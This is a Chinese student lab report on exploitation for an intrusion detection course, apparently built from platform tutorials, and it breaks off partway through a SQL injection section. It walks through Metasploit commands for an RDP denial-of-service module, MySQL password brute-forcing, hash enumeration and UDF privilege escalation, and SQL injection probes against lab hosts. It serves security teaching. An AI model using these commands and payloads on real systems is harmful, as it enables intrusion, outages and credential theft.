<!-- 下面是 实验报告 md 封面模板， 你可以自行修改-->

<!-- 显示校徽和校名图片，注意图片文件路径一定与md文件相匹配，否则无法显示-->
<img style='border-width:0' width=84 height=81 src="picture/广东工业大学校徽.png"> </img>
<p align=center> <img style='border-width:0' width=391 height=110 src="picture/广东工业大学校名.png"> </img> </p>

<!-- 下面是标题和信息的格式， infor1 给出 标题的格式， infor2 定义 信息的格式-->
<style>
p.infor1 {text-indent:0em;font-size:22.0pt;line-height:150%;font-family:黑体; font-style:blod;text-align:center;}
p.infor2 {text-indent:10em;font-size:16.0pt;line-height:150%;font-family:黑体; font-style:blod;}
p.date {text-indent:0em;font-size:16.0pt;font-family:黑体; font-style:blod;text-align:center;}
</style>

<!-- 下面是标题-->
<br/>
<p class="infor1">入侵检测技术实验报告</p>
<p class="infor1">漏洞利用</p>  <!--***************** 一定要修改为你的课设题目 ******************-->
<br/>

<!-- 下面是信息-->
<b>
<p class="infor2">学&nbsp;&nbsp;&nbsp;&nbsp;院 &nbsp; <u>计算机学院</u>
<p class="infor2">专&nbsp;&nbsp;&nbsp;&nbsp;业 &nbsp; <u>信息安全</u>
<p class="infor2">年级班别 &nbsp; <u> 信安18（2） </u>
<p class="infor2">学&nbsp;&nbsp;&nbsp;&nbsp;号 &nbsp; <u>318005434</u>
<p class="infor2">学生姓名 &nbsp; <u>钟景文</u>
<p class="infor2">指导老师 &nbsp; <u>郝彦军</u>

<!-- 下面是日期-->
<br/><br/><br/>
<p class="date">2021 年 6 月</p>
</b>

<!-- 下面指定打印时标题1处自动分页-->
<style>
@media print {
  h1 {
    page-break-before: always;
  }
}
</style>


# 实验目的
<!-- 下面是例子，请按实际内容填写-->

1. 学习使用Metasploit漏洞利用。  
2. 学习WEB端漏洞利用。  

# 实验平台
1. 操作机：
	- OS: Windows XP 
	- IP: 172.16.11.2
2. 目标机：
	- OS: Windows XP
	- IP：172.16.12.2
	- 目标地址：http://www.test.ichunqiu 
	- 目标地址：http://www.test.test
2. 使用软件:   
	- 端口扫描：Namp。  
3. 开发语言与技术：无。  

![网络括朴](picture/net1.png)

# 实验前准备
1. 查阅教材，掌握漏洞知识。  

# 实验内容

## Metasploit漏洞利用  

### Metasploit基础  

<div id="sectionDoc" class="markdown-body czsc_con smallTxt "><h3 id="-">实验目的</h3>
<p>本实验将学习如何使用号称能黑掉宇宙的Metasploit框架利用漏洞。</p>
<h3 id="-">实验工具</h3>
<blockquote>
<ul>
<li><strong>Metasploit</strong>:
Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。</li>
</ul>
</blockquote>
<h3 id="-">实验内容</h3>
<blockquote>
<p>通过前面的学习我们已经知道了如何挖掘服务端和web端的各种漏洞，本实验将学习如何使用号称<code>能黑掉宇宙</code>的Metasploit框架利用漏洞。</p>
<p>本部分主要学习Metasploit在kali下的基本使用，了解metasploit目录结构、基本命令 </p>
</blockquote>
<ul>
<li><strong>本部分概览  </strong></li>
</ul>
<blockquote>
<p> <strong>学习Metasploit基础</strong></p>
<pre><code> 1. 在kali中使用metasploit
 2. 了解metasploit目录结构
 3. 了解metasploit基本命令 
</code></pre></blockquote>
<ul>
<li><strong>基本原理 </strong></li>
</ul>
<blockquote>
<p>Metasploit 如何进行漏洞扫描？漏洞扫描器类似于其他类型的扫描器 -- 例如，端口扫描器有助于保障端口上的网络和系统的安全。这种扫描的目的是探测弱点并在某些 “坏家伙” 发动攻击前用扫描结果解决问题。
扫描过程中探测到的常见错误包括定位缓存溢出、未用补丁修补的软件、Structured Query Language (SQL) 问题等。扫描器的探测能力取决于扫描器本身：某些扫描器更加主动，能够探测缺失的补丁或配置错误，而另一些扫描器只是为您提供正确的方向。
Metasploit 比常规漏洞扫描器更进一步：它支持您研究自己的攻击和交付机制。其理念是：尽管其他扫描方法依赖已知的问题，但 Metasploit 允许研究自己的问题，从而提高扫描和研究的灵活性。</p>
</blockquote>
<h3 id="-">实验步骤</h3>
<h4 id="-1-kali-metasploit">步骤1：在kali中使用metasploit</h4>
<p>在kali中使用metasploit，需要先开启PostgreSQL数据库服务和metasploit服务，然后就可以完整的利用msf数据库查询exploit和记录了。这一点比bt5要方便很多，所以现在就放弃了bt5。</p>
<p>在打开Metasploit之前，先打开PostgreSQL服务，有利于Metasploit处理漏洞数据，输入以下命令开启PostgreSQL服务：</p>
<pre><code>service postgresql start
</code></pre><p><img src="picture/img (31).png" alt="Alt text"></p>
<p>输入以下命令查询PostgreSQL服务状态：</p>
<pre><code>service postgresql status
</code></pre><p>如上无错误出现，可以说明PostgreSQL服务已经开启。</p>
<p>在命令行下输入<code>msfconsole</code>来打开Metasploit：</p>
<p><img src="picture/img (31).png" alt="Alt text"></p>
<h4 id="-2-metasploit-">步骤2： 了解metasploit目录结构</h4>
<p>之所以会讲到这，是因为我认为框架代码是用来学习的一个非常好的来源。并且metasploit是用ruby脚本语言编写，所以阅读起来非常方便。 在渗透测试中，exploit编写过程前理解框架的优势以及大致内容则能够快速构建出自己的工具或者找到已知可用的工具。这样不仅有利于得到结果，也提高了效率。
这里只介绍几个目录，也希望读者能把modules下auxiliary的模块大致都看一遍。这样有个印象也便于快速查找。
对于工具的使用，没有会不会的。只是有没有发现而已。目录大概看一遍，这个问题就差不多了吧！</p>
<p><img src="picture/img (32).png" alt="Alt text"></p>
<p>Kali中msf的路径为<code>/usr/share/metasploit-framework</code></p>
<ul>
<li><strong>modules</strong></li>
</ul>
<p>首先看modules目录:</p>
<p><img src="picture/img (33).png" alt="Alt text"></p>
<p>modules目录详解：</p>
<p><code>Auxiliary</code>：辅助模块，
<code>encoders</code>：供msfencode编码工具使用，具体可以使用 msfencode –l
<code>exploits</code>：攻击模块 每个介绍msf的文章都会提到那个ms08_067_netapi，它就在这个目录下。
<code>nops</code>：NOP (No Operation or Next Operation) sled,由于IDS/IPS会检查数据包中不规则的数 据，所以在某些场合下(比如针对溢出攻击),某些特殊的滑行字符串(NOPS x90x90...)则会因为被拦截而导致攻击失效，所以此时需要修改 exploit中的NOPs.nops文件夹下的东西会在payload生成时用到。</p>
<p><code>payloads</code>：这里面列出的是攻击载荷,也就是攻击成功后执行的代码。
比如我们常设置的<code>windows/meterpreter/reverse_tcp</code>就在这个文件夹下。
<code>Post</code>：后渗透阶段模块，在获得meterpreter的shell之后可以使用的攻击代码。
比如常用的hashdump、arp_scanner就在这里。</p>
<ul>
<li><strong>data</strong></li>
</ul>
<p>其次是data目录:
这里存放的是metasploit的脚本引用文件，重点介绍几个文件:</p>
<p><img src="picture/img (34).png" alt="Alt text"></p>
<p>第一个是data下js文件夹下的detect，这里面存放的是metasploit的探针文件。如果看过metasploit浏览器攻击脚本的代 码，就会发现调用了一个js库，然后检查当前请求是否符合被攻击环境。如果符合则发送攻击代码，否则中断。Memory中主要是一些堆喷射代码。在大部分浏览器漏洞利用过程，堆喷射是一个不可或缺的过程(当然不是绝对的！)。并且不同的浏览器及版本间，堆喷射代码都有所不同。所以这里给出的探针代码和堆喷射代码是不是一个非常好的学习资源呢？ </p>
<ul>
<li><strong>script</strong></li>
</ul>
<p>最后是msf下script目录中的resource目录:</p>
<p><img src="picture/img (35).png" alt="Alt text"></p>
<p>这里的rc脚本相当于windows下的批处理脚本，在某些情况下会有一定便捷性。比如Veil在生成免杀payload的同时也会生成一个rc脚 本，此时使用<code>msfconsole –r xx.rc</code>便可以快速的建立一个和payload对应的handler，亦或在攻过程中需要你反复的 <code>set exploit</code>,那么就可以使用这个批处理脚本了，而这个目录下则是一些给定的rc脚本，虽然你可能不习惯这样使用，但作为改写自己的rc脚本的资源也不错。</p>
<h4 id="-3-metasploit-">步骤3： 了解metasploit基本命令</h4>
<p>列一些其他文章中不常提到的命令或者是我经常碰到或使用的方法。</p>
<pre><code>msfconsole
</code></pre><p>开启metasploit的console，有个重要的参数 –r，加载resources脚本</p>
<p><strong>数据库有关命令</strong></p>
<pre><code>hosts
</code></pre><p><img src="picture/img (36).png" alt="Alt text"></p>
<p>这里可以使用hosts查询指定字段的内容，可用的字段下面有列出。或者也可以使用<code>hosts –S “keyword”</code>进行搜索。</p>
<pre><code>creds
</code></pre><p><img src="picture/img (36).png" alt="Alt text"></p>
<p>creds命令可以列出成功获取到的信息，比如用户名密码，数据库密码，开放端口及服务等。</p>
<p><strong>console中有关命令 </strong></p>
<pre><code>search
</code></pre><p><img src="picture/img (36).png" alt="Alt text"></p>
<p>搜索一切可以use的模块,常用的方法是search 直接加关键词，比如<code>search 08_067</code>,但是我们也可以根据cve编号查找。通常用nessus扫到的漏洞都有cve信息，这里我们就可以这样搜索了。</p>
<p><img src="picture/img (38).png alt="Alt text"></p>
<pre><code>use
</code></pre><p><img src="picture/img (36).png" alt="Alt text"></p>
<p>搜索到相应模块，<code>use 模块名</code>进入相应模块</p>
<pre><code>show advanced
</code></pre><p><img src="picture/img (36).png" alt="Alt text"></p>
<p>在选定一个module(exploit,payload …)之后，使用<code>show advanced</code>命令可以显示关于此module的高级选项。</p>
<h3 id="-">实验结果分析与总结</h3>
<blockquote>
<p>本部分学习了Metasploit的目录结构，语法基础，此步骤为我们此后的漏洞利用奠定基础，上述知识在实战中经常用到。</p>
</blockquote>
<h3 id="-">思考</h3>
<p>1.结合我们前面所学知识，试试模拟一个从漏洞发现到漏洞利用模块寻找，载入漏洞模块的过程。</p>
</div>

### Metasploit之系统漏洞利用  

<div id="sectionDoc" class="markdown-body czsc_con smallTxt "><h3 id="-">实验目的</h3>
<blockquote>
<p>本部分以目标机<code>www.test.ichunqiu</code>的<code>winwows XP</code>系统的远程溢出漏洞为例，尝试使用Metasploit渗透攻击，主要是方便大家了解一次实战的msf渗透过程</p>
</blockquote>
<h3 id="-">实验工具</h3>
<blockquote>
<ul>
<li><strong>Metasploit</strong>:
Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。</li>
</ul>
</blockquote>
<h3 id="-">实验内容</h3>
<ul>
<li><strong>本部分概览  </strong></li>
</ul>
<blockquote>
<p> <strong><code>ms_12_020</code>远程溢出漏洞实例</strong></p>
<pre><code> 1. Nmap判断系统漏洞
 2. 载入相应漏洞模块并配置参数
 3. 开始渗透并取得结果 
 4. 结果验证与利用
</code></pre></blockquote>
<h3 id="-">实验步骤</h3>
<h4 id="-1-nmap-">步骤1：Nmap判断系统漏洞</h4>
<blockquote>
<p>使用Nmap漏洞扫描脚本发现漏洞</p>
</blockquote>
<p><code>注意：nmap也可以在Metasploit中直接调用</code></p>
<p>打开命令行输入如下命令：</p>
<pre><code>nmap --script=vuln www.test.ichunqiu
</code></pre><blockquote>
<p>这里的Nmap使用<code>--script=vuln</code>参数调用漏洞探测脚本探测目标是否存在漏洞</p>
</blockquote>
<p>稍许，得到扫描结果：</p>
<p><img src="picture/img (37).png" alt="resources/files/picture/fa7da5959bfd7d06/Section_1500465550000.jpg"></p>
<p><img src="picture/img (38).png" alt="resources/files/picture/fa7da5959bfd7d06/Section_1500465550000.jpg"></p>
<p>我们贴出具体的扫描结果：</p>
<pre><code>root@v5est0r:~# nmap --script=vuln www.test.ichunqiu

Starting Nmap 7.01 ( https://nmap.org ) at 2016-11-16 12:13 CST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     10.211.55.5
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for www.test.ichunqiu (10.211.55.6)
Host is up (0.00064s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
MAC Address: 00:1C:42:04:23:83 (Parallels)

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, 
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a 
|           denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE 
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, 
|           aka "SMBv2 Negotiation Vulnerability." 
|           
|     Disclosure date: 2009-09-08
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
| smb-vuln-ms12-020: 
|   VULNERABLE:
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|       。。。。。
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 42.70 seconds
</code></pre><p>可以通过上述扫描结果得知：</p>
<blockquote>
<ul>
<li><code>ms12-020</code>
这个漏洞编号的State: VULNERABLE，即为可用</li>
</ul>
</blockquote>
<p>漏洞描述:</p>
<pre><code>BUGTRAQ ID: 52354 CVE ID: CVE-2012-0152 远程桌面协议（RDP, Remote Desktop Protocol）是一个多通道（multi-channel）的协议，让用户（客户端或称“本地电脑”）连上提供微软终端机服务的电脑（服务器端或称“远程电脑”）。 Windows在处理某些RDP报文时Terminal Server 存在错误，可被利用造成服务停止响应。
</code></pre><p>最后我们会用Metasploit的<code>search</code>功能找到对应的漏洞编号`ms12-020加以利用。具体利用方式将在下面介绍。</p>
<h4 id="-2-">步骤2：载入相应漏洞模块并配置参数</h4>
<p>首先打开命令行输入以下命令打开metasploit：</p>
<pre><code class="lang-`">msfconsole
</code></pre>
<p>进入msf之后，使用<code>search 漏洞编号</code>来查找相关模块：</p>
<pre><code>search ms12
</code></pre><p><img src="picture/img (39).png" alt="resources/files/picture/fa7da5959bfd7d06/Section_1500465569000.jpg"></p>
<p>如上图我们搜索到了该漏洞编号的对应漏洞利用模块，
模块名为：<code>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids</code></p>
<p>使用<code>use 模块名</code>来进入相关模块：</p>
<pre><code>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
</code></pre><p>进入该模块后，使用<code>show options</code>来查看需要设置的相关参数：</p>
<pre><code>show options
</code></pre><p><img src="picture/img (40).png" alt="resources/files/picture/fa7da5959bfd7d06/Section_1500465615000.jpg"></p>
<p>如上图，我们可以看到，只有1参数需要我们设置，<code>RHOST</code>参数的值为空，需要我们进行设定。</p>
<p><code>RHOST</code>参数即为目标机地址，使用以下命令设置目标机地址为<code>172.16.12.2</code></p>
<pre><code>set RHOST 172.16.12.2
</code></pre><p>最后再使用<code>show options</code>来查看需要设置的相关参数是否完全设置好.</p>
<p>如上图可看到一切设置妥当。</p>
<h4 id="-3-">步骤3：开始渗透与结果验证</h4>
<p>一切设置妥当之后，
我们先新打开一个命令行窗口，执行：</p>
<pre><code>ping 172.16.12.2
</code></pre><p><img src="picture/img (41).png" alt="resources/files/picture/fa7da5959bfd7d06/Section_1500465677000.jpg"></p>
<p>然后切换到刚才的漏洞利用窗口使用以下命令开启渗透过程：</p>
<pre><code>exploit
</code></pre><p><img src="picture/img (41).png" alt="resources/files/picture/fa7da5959bfd7d06/Section_1500465706000.jpg"></p>
<p>如上图，我们看到，漏洞利用成功。</p>
<p>在ping目标机的过程中，服务器有一段时间是无响应的，那时服务器正在重启。</p>
<h3 id="-">实验结果分析与总结</h3>
<blockquote>
<p>本部分主要学习了如何配置Metasploit相关漏洞模块的参数并对相关的系统或服务漏洞进行利用，并验证漏洞利用结果</p>
</blockquote>
<h3 id="-">思考</h3>
<ol>
<li>除了通过Nmap漏洞扫描脚本，我们还能通过哪些方式来探测系统或服务漏洞呢？</li>
</ol>
</div>

### Metasploit第三方网络服务渗透  

<div id="sectionDoc" class="markdown-body czsc_con smallTxt "><h3 id="-">实验目的</h3>
<blockquote>
<p>本部分以目标机<code>www.test.ichunqiu</code>的mysql服务为例，尝试使用Metasploit渗透攻击，学习攻击方法，理解攻击原理。</p>
</blockquote>
<h3 id="-">实验工具</h3>
<blockquote>
<ul>
<li><strong>Metasploit</strong>:
Metasploit是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。它本身附带数百个已知软件漏洞的专业级漏洞攻击工具。当H.D. Moore在2003年发布Metasploit时，计算机安全状况也被永久性地改变了。仿佛一夜之间，任何人都可以成为黑客，每个人都可以使用攻击工具来攻击那些未打过补丁或者刚刚打过补丁的漏洞。软件厂商再也不能推迟发布针对已公布漏洞的补丁了，这是因为Metasploit团队一直都在努力开发各种攻击工具，并将它们贡献给所有Metasploit用户。</li>
</ul>
</blockquote>
<h3 id="-">实验内容</h3>
<ul>
<li><strong>本部分概览  </strong></li>
</ul>
<blockquote>
<p> <strong>Metasploit第三方网络服务(mysql)渗透</strong></p>
<pre><code> 1. 判断Mysql数据库版本
 2. 暴力破解mysql密码
 3. Mysql认证漏洞利用 
 4. UDF提权
</code></pre></blockquote>
<h3 id="-">实验步骤</h3>
<h4 id="-1-mysql-">步骤1： 判断Mysql数据库版本</h4>
<p>nmap的指纹识别可以精确的判断数据库的版本号，而metasploit提供的模块的特点就是能够判断数据库是否允许外链</p>
<p>如下配置参数：</p>
<pre><code>use auxiliary/scanner/mysql/mysql_version

set RHOSTS www.test.ichunqiu
</code></pre><p><img src="picture/img (42).png" alt="Alt text"></p>
<p>开始执行：</p>
<pre><code>exploit
</code></pre><p>如果允许外链则可以显示版本号，如下图则成功：</p>
<p><img src="picture/img (42).png" alt="Alt text"></p>
<h4 id="-2-mysql-">步骤2： 暴力破解mysql密码</h4>
<blockquote>
<p>在选择 MySQL 登录利用模块之后，我们设置了选项并执行了漏洞利用，这让我们能够爆破 MySQL 登录。Metasploit 使用提供的用户名和密码文件。并尝试爆破 MySQL 数据库。</p>
</blockquote>
<p>如果数据库允许外链，则能暴力破解密码</p>
<p>这个模块没有默认字典，新建一个简单的passs.txt</p>
<p><img src="picture/img (43).png" alt="Alt text"></p>
<p>如下配置参数：</p>
<pre><code>use auxiliary/scanner/mysql/mysql_login

set RHOSTS www.test.ichunqiu

set PASS_FILE /root/pass.txt

set USERNAME root
</code></pre><p>开启破解：</p>
<pre><code>exploit
</code></pre><p><img src="picture/img (44).png" alt="Alt text"></p>
<p>破解成功：</p>
<p><img src="picture/img (44).png" alt="Alt text"></p>
<p>这个步骤中，我们使用了自己生成的用户名和密码文件。有许多方法可以生成用户名和密码单词列表，这些方法在我们之前的知识点有所提及。</p>
<h4 id="-2-">步骤2: 枚举数据库信息</h4>
<p>枚举的信息包括mysql版本号，操作系统架构，路径和密码hash等一些信息。</p>
<p>如下配置参数：</p>
<pre><code>use auxiliary/admin/mysql/mysql_enum

set RHOST www.test.ichunqiu

set PASSWORD root

set USERNAME root
</code></pre><p><img src="picture/img (45).png" alt="Alt text"></p>
<p>开始执行漏洞利用：</p>
<pre><code>exploit
</code></pre><p><img src="picture/img (46).png" alt="Alt text"></p>
</code></pre><p><img src="picture/img (47).png" alt="Alt text"></p>
</code></pre><p><img src="picture/img (48).png" alt="Alt text"></p>
<p>得到以下一些有用的信息：</p>
<!-- <p><img src="../../resources/files/picture/c1e4cb81a8b13176/1479650350940.png" alt="Alt text"></p> -->
<pre><code>[*] Running MySQL Enumerator...
[*] Enumerating Parameters
[*]  MySQL Version: 5.5.40  //数据库类型及数据库版本
[*]  Compiled for the following OS: Win32  //目标机操作系统类型
[*]  Architecture: x86  //目标机乃是32位操作系统
[*]  Server Hostname: cde9  //目标机网络名
[*]  Data Directory: C:Program FilesphpStudyMySQLdata  //数据库存放目录
[*]  List of Accounts with Password Hashes:
[*]   User: root Host: localhost Password Hash: *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
//此为root账户密码的hash
</code></pre><h4 id="-3-mysql-">步骤3： Mysql认证漏洞利用</h4>
<pre><code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump
</code></pre><p>这个模块利用的是CVE-2012-2122，</p>
<p>mysql任意用户密码概率登陆漏洞，按照公告说法大约256次就能够蒙对一次、<code>All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 are vulnerable.</code></p>
<blockquote>
<p><strong>CVE ID: CVE-2012-2122</strong>
MariaDB是为MySQL提供偶然替代功能的数据库服务器。MySQL是开源数据库。</p>
<p>MariaDB 5.1.62, 5.2.12、5.3.6、5.5.23之前版本和MySQL 5.1.63、5.5.24、5.6.6之前版本在用户验证的处理上存在安全漏洞，可能导致攻击者无需知道正确口令就能登录到MySQL服务器。</p>
<p>用户连接到MariaDB/MySQL后，应用会计算和比较令牌值，由于错误的转换，即使memcmp()返回非零值，也可能出现错误的比较，造成MySQL/MariaDB误认为密码是正确的，因为协议使用的是随机字符串，该Bug发生的几率为1/256。MySQL的版本是否受影响取决于程序的编译方式，很多版本（包括官方提供的二进制文件）并不受此漏洞的影响。</p>
<p>也就是说只要知道用户名，不断尝试就能够直接登入SQL数据库。按照公告说法大约256次就能够蒙对一次。</p>
</blockquote>
<p>参照下图配置模块参数：</p>
<pre><code>use auxiliary/scanner/mysql/mysql_authbypass_hashdump

set RHOSTS www.test.ichunqiu

exploit
</code></pre><p><img src="picture/img (49).png" alt="Alt text"></p>
<p>查看结果，漏洞并没有利用成功：</p>
<p><img src="picture/img (49).png" alt="Alt text"></p>
<h4 id="-4-udf-">步骤4：UDF提权</h4>
<p>Metasploit提供的exploit适应于5.5.9以下，我这边的mysql版本号为5.5.20，已经超出了版本限制，提权一直不成功，</p>
<pre><code>use exploit/windows/mysql/mysql_payload
</code></pre><p><img src="picture/img (50).png" alt="Alt text"></p>
<p>如下图配置参数：</p>
<p><img src="../../resources/files/picture/c1e4cb81a8b13176/1479629068927.png" alt="Alt text"></p>
<p>随后输入<code>exploit</code>开启发送荷载：</p>
<p><img src="../../resources/files/picture/c1e4cb81a8b13176/2016-11-20___16_08_54.gif" alt="Alt text"></p>
<p>然而结果不尽人意：</p>
<p><img src="../../resources/files/picture/c1e4cb81a8b13176/1479629531842.png" alt="Alt text"></p>
<p><code>[*] Exploit completed, but no session was created.</code></p>
<p>所以说，再强大的自动化工具也只是辅助。
无论是技术、工具，本质都是人为的，既然工具没能解决，我们就来人为解决吧。
我根据UDF提权原理，写了个python脚本，在kali的桌面的<code>file</code>目录的<code>mysql.py</code>。
<code>脚本依赖pymysql模块，我已在kali里面安装好。</code>
我们先来看下脚本的功能和使用方法：</p>
<p><strong>功能：</strong></p>
<ol>
<li><p>自动导出mof文件，</p>
</li>
<li><p>自动判断mysql版本，根据版本不同导出UDF的DLL到不同目录，UDF提权</p>
</li>
<li><p>导出LPK.dll文件，劫持系统目录提权</p>
</li>
<li><p>写启动项有问题，已经注释掉 </p>
</li>
</ol>
<p><strong>用法:</strong></p>
<pre><code>python mysql.py 目标机ip mysql端口 mysql账户 mysql密码
</code></pre><p>我们来实际测试一下，如图：</p>
<pre><code>python mysql.py www.test.ichunqiu 3306 root root
</code></pre><p><img src="picture/img (54).png" alt="Alt text"></p>
<p>如上图，可以看到提权成功，其实UDF函数执行的是下图中圈中的cmd命令，大家修改该部分命令再执行，命令即会在目标机被执行：</p>
<p><img src="picture/img (54).png" alt="Alt text"></p>
<p>下面几节我们会学到UDF提权的具体相关知识。</p>
<h3 id="-">实验结果分析与总结</h3>
<blockquote>
<p>本部分主要学习了如何查找并配置Metasploit相关漏洞模块的参数并对相关的服务漏洞进行利用</p>
</blockquote>
<h3 id="-">思考</h3>
<ol>
<li>结合我们前面所学知识，假如我们通过Nmap漏洞扫描脚本没扫到相关漏洞编号，但是探测出目标开启了1433端口对应的mssql服务。
试试模拟一个从漏洞发现到漏洞利用模块寻找，载入漏洞模块、最后利用漏洞取得session的过程。</li>
</ol>
</div>

## WEB端漏洞利用  

### sql注入漏洞发现与利用  

<div id="sectionDoc" class="markdown-body czsc_con smallTxt "><h3 id="-">实验目的</h3>
<p>通过本实验，了解SQL注入原理，并学习如何通过安全工具测试注入点和手工测试注入点。</p>
<h3 id="-">实验工具</h3>
<blockquote>
<ul>
<li><p><strong>DVWA </strong>:&gt;   DVWA (Dam Vulnerable Web Application)DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。</p>
</li>
<li><p><strong>Havij </strong>:
Havij是一款自动化的SQL注入漏洞利用工具,它能够帮助渗透测试人员发现和利用Web应用程序的SQL注入漏洞。工具来源于国外。</p>
</li>
</ul>
</blockquote>
<h3 id="-">实验内容</h3>
<blockquote>
<p>通过本部分学习发现和利用sql注入漏洞。</p>
</blockquote>
<ul>
<li><strong>本部分概览</strong><ul>
<li>发现注入点</li>
<li>手工进行sql注入攻击</li>
<li>利用工具进行sql注入攻击</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>SQL注入（SQL Injection ）</strong></p>
<ul>
<li>SQL注入漏洞可以说是在企业运营中会遇到的最具破坏性的漏洞之一，它也是目前被利用得最多的漏洞。要学会如何防御SQL注入，我们首先要对他进行了解。 </li>
<li>SQL注入（SQLInjection）是这样一种漏洞：当我们的Web app 在向后台数据库传递SQL语句进行数据库操作时。如果对用户输入的参数没有经过严格的过滤处理，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或修改数据库中的数据。</li>
<li>SQL注入漏洞的本质是把用户输入的数据当做代码来执行，违背了<code>数据与代码分离</code>的原则。</li>
<li><p>SQL注入漏洞有两个关键条件，理解这两个条件可以帮助我们理解并防御SQL注入漏洞：</p>
<ul>
<li>用户能控制输入的内容</li>
<li>Web应用执行的代码中，拼接了用户输入的内容</li>
</ul>
<p>SQL注入攻击的产生 </p>
<ul>
<li>当应用程序使用输入内容来构造动态SQL语句以访问数据库时，会发生SQL注入攻击。
如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的字符串来传递，也会发生SQL注入。</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="-">实验步骤</h3>
<h4 id="-1-">步骤1：发现注入注入点</h4>
<blockquote>
<p>本步利用手工发现注入点</p>
</blockquote>
<p>首先我们进入目标网站，随意点击几个连接，寻找网站URL以<code>id</code>参数为结尾的页面。以id等为参数，即是调用数据的特征，可能会造成注入漏洞。</p>
<p>我们为大家提供了如下一个URL：</p>
<blockquote>
<p>此页面我们做了特殊的处理，如果查询正确，会显示查询时执行的sql语句，以便于我们分析漏洞的原理。</p>
</blockquote>
<pre><code>http://www.test.test/dwva/injet.php?id=1
</code></pre><p>先来介绍下HackBar火狐浏览插件的使用，浏览器访问相关URL之后，点击<code>Load URL</code>在插件输入栏就载入了当前的URL，在插件输入栏修改URL之后点击<code>Execute</code>即可访问相关URL：</p>
<p><img src="picture/img (55).png" alt="Alt text"></p>
<p>看到ID参数应该第一时间联想到注入，我们首先使用<code>and 1=1</code>和<code>and 1=2</code>带入参数查询进行初步判断，是否有注入漏洞：</p>
<blockquote>
<p>为何使用<code>and 1=1</code>和<code>and 1=2</code>带入参数查询进行能初步判断是否存在注入？稍微有点编程基础的都知道，<code>and</code>在逻辑运算符的意义就是其前后的条件同时成立整条命令才会正确执行，已知<code>and</code>之前是一个正确查询，<code>1=1</code>是正确的，于是整条语句就正确了，可以匹配到相关结果。反之，<code>1=2</code>是错误的，于是整条语句就错误了，不可以匹配到相关结果。</p>
</blockquote>
<p><img src="picture/img (56).png" alt="Alt text"></p>
<p>参照上图分析下使用<code>and 1=1</code>和<code>and 1=2</code>带入参数查询时的sql语句执行情况：</p>
<p>当访问如下URL时：</p>
<pre><code>http://www.test.test/dwva/injet.php?id=1 and 1=1
</code></pre><p>当前sql查询语句：</p>
<pre><code>SELECT * FROM admin WHERE id=1 and 1=1
</code></pre><p><code>and</code>运算符前后都是正确的条件，于是可以返回相关结果。</p>
<p>当访问如下URL时：</p>
<pre><code>http://www.test.test/dwva/injet.php?id=1 and 1=2
</code></pre><p>当前sql查询语句：</p>
<pre><code>SELECT * FROM admin WHERE id=1 and 1=2
</code></pre><p><code>and</code>运算符前是正确的查询，而其后<code>1=2</code>是错误的条件，于是不可以查询到相关结果。</p>
<p>其实判断有注入的方法有很多，并不局限于<code>and 1=1</code>这个参数。
例如：只需要在ID参数后面输入任意的字符，只要网站页面报错，则说明有注入。</p>
<p><img src="picture/img (57).png" alt="Alt text"></p>
<p>这是为什么？因为只要网站报错，就说明我们任意输入的字符被带入到数据库查询了，因此我们可以插入恶意的SQL语句，注入攻击就这样产生了</p>
<p>现在已经成功的验证了这个网站的确存在注入，下一步我们将进行注入攻击</p>
<h4 id="-2-sql-">步骤2：手工进行sql注入攻击</h4>
<blockquote>
<p> 本步骤将学习手工在注入点进行sql注入攻击</p>
</blockquote>
<ul>
<li>首先来学习下UNION联合查询的相关知识：</li>
</ul>
